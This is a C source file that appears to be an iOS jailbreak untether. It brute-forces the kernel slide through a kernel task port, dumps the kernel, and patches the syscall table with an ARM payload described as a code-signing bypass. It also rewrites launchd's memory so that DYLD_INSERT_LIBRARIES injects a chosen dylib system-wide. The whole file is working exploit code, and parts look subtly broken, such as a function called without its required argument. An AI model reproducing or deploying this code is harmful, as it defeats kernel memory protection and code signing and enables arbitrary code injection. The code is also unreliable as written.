#include <time.h>
#include <stdio.h>
#include <spawn.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach/mach.h>
#include "envbypass.h"

task_t tfp1;

uint32_t lread_uint32(uint32_t addr) {
    vm_size_t bytesRead=0;
    uint32_t ret = 0;
    vm_read_overwrite(tfp1, addr, 4, (vm_address_t)&ret, &bytesRead);
    return ret;
}

int lwrite_uint32(uint32_t addr, uint32_t value) {
    return vm_write(tfp1, addr, (vm_offset_t)&value, 4);
}

bool page_allocated(uint32_t addr) {
    vm_size_t bytesRead=0;
    uint32_t ret = 0;
    return vm_read_overwrite(tfp1, addr, 4, (vm_address_t)&ret, &bytesRead) == 0;
}

extern char **environ;

#include <mach/mach_time.h>
#include <mach/mach.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <syslog.h>
#include <stdio.h>
#include <errno.h>

/* kernel HACKED */
task_t tfp0;

/* KASLR shit */
#define LC_SIZE 0x0000000f
#define UNSLID_BASE 0x80001000

/* fuck you apple let me use syscall(...) */
#pragma clang diagnostic ignored "-Wdeprecated-declarations"

#ifndef USLEEP_TIME_IN_US
#define USLEEP_TIME_IN_US 250
#endif

/* slip-n-slide into bullshit :tm: */
uint32_t slide;

uint32_t kread_uint32(uint32_t addr) {
    vm_size_t bytesRead=0;
    uint32_t ret = 0;
    vm_read_overwrite(tfp0, addr, 4, (vm_address_t)&ret, &bytesRead);
    return ret;
}

void kwrite_uint32(uint32_t addr, uint32_t value) {
    vm_write(tfp0, addr, (vm_offset_t)&value, 4);
}

void kwrite_uint16(uint32_t addr, uint16_t value) {
    vm_write(tfp0, addr, (vm_offset_t)&value, 2);
}

uint32_t get_kernel_slide(){
    uint32_t slide;
    uint32_t base = 0x80001000;
    uint32_t slid_base;

    /*
     * slide = 0x1000000 + (0x200000 * random byte)
     * start at 256 so we don't get the kernel mad at us for reading unmapped memory
     * or something idk
     */
    
    for (int slide_byte = 256; slide_byte >= 1; slide_byte--) {
        slide = 0x01000000 + 0x00200000 * slide_byte;
        slid_base = base + slide;
        
        if (kread_uint32(slid_base) == 0xfeedface) {
            /*
             * this looks like a kernel base
             */
            
            if (kread_uint32(slid_base + 0x10) == LC_SIZE) {
                /*
                 * we found it bae
                 */
                
                return slide;
            }
        }
    }
    return -1;
}

uint8_t* dump_kernel(uint8_t* kdata, uint32_t len) {
    vm_size_t segment = 4;

    /*
     * this code is stolen from jailbreak.m in p0laris,
     * which was stolen from internal Athenus Dev Team tools :P
     */
    
    printf("[*] finding acceptable segment size...\n");
    
    for (int i = 0; i < 16384; i++) {
        /*
         * basically, continuously increment `segment` we're reading by by 4.
         * re-read from the kernel base until vm_read_overwrite fails.
         *
         * now, technically, there's probably a better way to get this value,
         * and also likely and a better way to check that won't run into issues
         * if vm_read_overwrite fails for other reasons, but i CBA. :P
         */
        
        int ret = vm_read_overwrite(tfp0,
                                    UNSLID_BASE + slide,
                                    segment,
                                    (vm_address_t)kdata + (i * segment),
                                    &segment);

        if (ret == 0) {
            /*
             * no fail, increase by 4.
             */
            
            segment += 4;
        } else {
            /*
             * it failed at a length of `segment`, and we increase by 4 in the loop.
             * so, subtracting 4 will give us the last value we used that succeeded.
             */
            
            printf("[*] mach_vm_read_overwrite returned %d at segment %d\n",
                    ret,
                    segment);
            segment -= 4;
            break;
        }
    }

    /*
     * we found the max segment size!
     */
    
    printf("[*] acceptable segment size: %d\n", segment);

    for (int i = 0; i < len / segment; i++) {
        /*
         * DUMP DUMP DUMP
         */
        
        vm_read_overwrite(tfp0,
                          UNSLID_BASE + slide + (i * segment),
                          segment,
                          (vm_address_t)kdata + (i * segment),
                          &segment);
    }
    
    return kdata;
}

uint32_t find_syscall0(uint32_t region, uint8_t* kdata, size_t ksize) {
    uint32_t addy = -1;
    char* hfs_private_directory_data = memmem(kdata,
                                              ksize,
                                              ".HFS+ Private Directory Data\r",
                                              strlen(".HFS+ Private Directory Data\r"));
    printf("[*] hfs_private_directory_data = %p\n",
           hfs_private_directory_data);
    uint32_t hfs_private_directory_data_addy =   (uintptr_t)hfs_private_directory_data
                                               - (uintptr_t)kdata
                                               + region;
    char* hfs_private_directory_data_addy_ptr = memmem(kdata,
                                                       ksize,
                                                       (char*)&hfs_private_directory_data_addy,
                                                       sizeof(hfs_private_directory_data_addy));
    printf("[*] hfs_private_directory_data_addy_ptr = %p\n",
           hfs_private_directory_data_addy_ptr);
    uint32_t hfs_private_directory_data_ptr_addy =   (uintptr_t)hfs_private_directory_data_addy_ptr
                                                   - (uintptr_t)kdata;
    addy = hfs_private_directory_data_ptr_addy + 0x4;
    
    return addy;
}

uint32_t syscall0_addr = -1;
#define DEBUG_SYSCALLS 0

uint32_t function_addr(int syscall_id, uint32_t slide) {
    uint32_t function_entry_addr    = syscall0_addr + (syscall_id * 0xc);
    uint32_t function_addr          = kread_uint32(function_entry_addr);
    printf("[*] function_entry_addr = 0x08%x, function_addr = 0x%08x\n", function_entry_addr, function_addr);
    return function_addr;
}

void replace_syscall_with_addr(int syscall_id, uint32_t addr, uint32_t slide, uint16_t num_args, uint32_t arg_bytes) {
    uint32_t function_entry_addr = syscall0_addr + (syscall_id * 0xc);
#if DEBUG_SYSCALLS
    printf("[*] function_entry_addr = 0x%08x, function_addr = 0x%08x\n", function_entry_addr, kread_uint32(function_entry_addr));
#endif
    kwrite_uint32(function_entry_addr, addr | 1);
    kwrite_uint16(function_entry_addr + 0x8, num_args);
    kwrite_uint32(function_entry_addr + 0xa, arg_bytes);
#if DEBUG_SYSCALLS
    printf("[*] function_entry_addr = 0x%08x, function_addr = 0x%08x\n", function_entry_addr, kread_uint32(function_entry_addr));
#endif
}

void replace_syscall(int syscall_id, uint8_t* code, uint32_t length, uint32_t slide, uint16_t num_args, uint32_t arg_bytes) {
    uint32_t where = slide + 0x80001b00;
    vm_write(tfp0, where, (vm_offset_t)code, length);
    replace_syscall_with_addr(syscall_id, where, slide, num_args, arg_bytes);
}

#define ownage_syscall 379

void csbypass(int offset_) {
    uint32_t* comm_page_time;
    kern_return_t ret;
    uint8_t* kdata;
    
    uint8_t payload420[] = {
        0x08, 0x68,             // ldr r0, [r1]
        0x44, 0xf2, 0x44, 0x44, // movw r4, #0x4048
        0xcf, 0xf6, 0xff, 0x74, // movt r4, #0xffff
        0x20, 0x60,             // str r0, [r4]
        0x4f, 0xf0, 0x00, 0x00, // mov r0, #0x0
        0x70, 0x47              // bx lr
    };
    
    int syscall_ret = 0;
    uint32_t sret = 0;
    
    printf("[*] offset=%d\n", offset_);
    
    ret = task_for_pid(mach_task_self(), 0, &tfp0);
    printf("[*] ret=%d, tfp0=%x\n", ret, tfp0);
    
    slide = get_kernel_slide();
    printf("[*] slide=0x%08x\n", slide);
    
    kdata = (uint8_t*)malloc(32 * 1024 * 1024);
    printf("[*] kdata=%p\n", kdata);
    
    dump_kernel(kdata, 32 * 1024 * 1024);
    syscall0_addr =   find_syscall0(slide + 0x80001000,
                                    kdata,
                                    32 * 1024 * 1024)
                    + 0x80001000
                    + slide;
    
    free(kdata);
    kdata = NULL;
    
    printf("[*] 0x%08x\n", syscall0_addr);
    
    printf("[*] 0x%08x\n", function_addr(ownage_syscall, slide));
    
    replace_syscall(ownage_syscall, payload420, sizeof(payload420), slide, 1, 4);
    
    printf("[*] 0x%08x\n", function_addr(ownage_syscall, slide));
    
    syscall_ret = syscall(ownage_syscall, offset_);
    sret = errno;

    printf("[*] syscall(%d); = %d. errno(dec) = %d, errno(hex) = 0x%x. \n", ownage_syscall, syscall_ret, sret, sret);
}

char swaggang[] = "swaggang";

bool _0wn(char* global_inject_dylib) {
    task_for_pid(mach_task_self(), 1, &tfp1);
    printf("[*] launchd DYLD env bypass by @__spv\n");
    printf("[*] tfp1=0x%x\n", tfp1);
    vm_size_t size;
    uint32_t addy;
    uint8_t* page = malloc(0x1000);
    uint32_t address_of_string = 0;
	
	char* replace_me = "SMOKETREESCSBYSPV1337";
    
    for (int i = 0; i < 10; i++) {
        printf("[*] setting %s=%s\n", replace_me, global_inject_dylib);
        pid_t pid;
        char *argv[] = {"/bin/launchctl", "setenv", replace_me, global_inject_dylib, NULL};
    
        int status;
        status = posix_spawn(&pid, "/bin/launchctl", NULL, NULL, argv, environ);
        if (status == 0) {
            do {
                if (waitpid(pid, &status, 0) != -1) {
                    //
                } else {
                    perror("waitpid");
                    goto out;
                }
            } while (!WIFEXITED(status) && !WIFSIGNALED(status));
        }
        else {
            printf("posix_spawn: %s\n", strerror(status));
        }
    }
    
    char* hax = "DYLD_INSERT_LIBRARIES";
    
    printf("[*] searching teh pages\n");
    
    bool found_one = false;
    uint32_t num_found = 0;

    char* read_data;
    
    for (uint32_t pagen = 0x0; pagen < (0xffffffff >> 12); pagen++) {
        
        if (pagen % ((0xffffffff >> 12) / 100) == 0) {
            //printf("%d\n", pagen / ((0xffffffff >> 12) / 100));
        }
        
        uint32_t page_start = pagen << 12;
        if (vm_read_overwrite(tfp1, page_start, 0x1000, (vm_address_t)page, &size))
            continue; // page isn't allocated
        
        ;
        
        uint8_t* find = (uint8_t*)memmem(page, 0x1000, replace_me, 21);
        
        if (!find)
            continue; // not in this page
        
        /* if we reach here, we have found a page that is allocated in launchd, containing our string. */
        uint32_t offset = (uint32_t)(find - page);
        address_of_string = page_start + offset;
        
        printf("[*] found an addy 0x%08x\n", address_of_string);
        printf("[*] lread_uint32(addy) = 0x%08x\n", lread_uint32(address_of_string));
        printf("[*] vm_write(0x%08x) = 0x%x\n", addy, vm_write(tfp1, (vm_address_t)address_of_string, (vm_offset_t)hax, 21));
        printf("[*] lread_uint32(addy) = 0x%08x\n", lread_uint32(address_of_string));
        
        num_found++;
        found_one = true;

        pid_t pid;
        char *argv[] = {"/bin/sh", "-c", "launchctl getenv DYLD_INSERT_LIBRARIES 2>&1 > /tmp/env", NULL};
    
        int status;
        status = posix_spawn(&pid, "/bin/sh", NULL, NULL, argv, environ);
        if (status == 0) {
            do {
                if (waitpid(pid, &status, 0) != -1) {
                    //
                } else {
                    perror("waitpid");
                    goto out;
                }
            } while (!WIFEXITED(status) && !WIFSIGNALED(status));
        }
        else {
            printf("posix_spawn: %s\n", strerror(status));
        }

        FILE* fp = fopen("/tmp/env", "r");

        if (!fp) continue;

        fseek(fp, 0, SEEK_END);
        size_t len = ftell(fp);
        fseek(fp, 0, SEEK_SET);
    
        read_data = (char*)malloc(len);
        fread(read_data, len, 1, fp);
        fclose(fp);
        
        if (strstr(read_data, "dylib")) {
            // prolly good, right?
            break;
        }
        
    }
    
    unlink("/tmp/env");
    
    free(page);
    if (read_data)
        free(read_data);

out:
    if (found_one) {
        printf("[*] done\n");
        return true;
    }
    else {
        printf("[*] didn't find any. whatever, let's try again\n");
        return _0wn();
    }
}

int main(int argc, char* argv[]) {
    _0wn();
    
    uint32_t offset = 0;
    time_t val;
    FILE* fp;
    syslog(LOG_SYSLOG, "game over");
    
    if (argc >= 2) {
        offset = atoi(argv[1]);
        goto do_it;
    }
    
    fp = fopen("/untether/offset", "rb");
    if (fp) {
        fread(&val, sizeof(val), 1, fp);
        fclose(fp);
        offset = val;
    }
    
do_it:
    csbypass(offset);
    
    return 0;
}
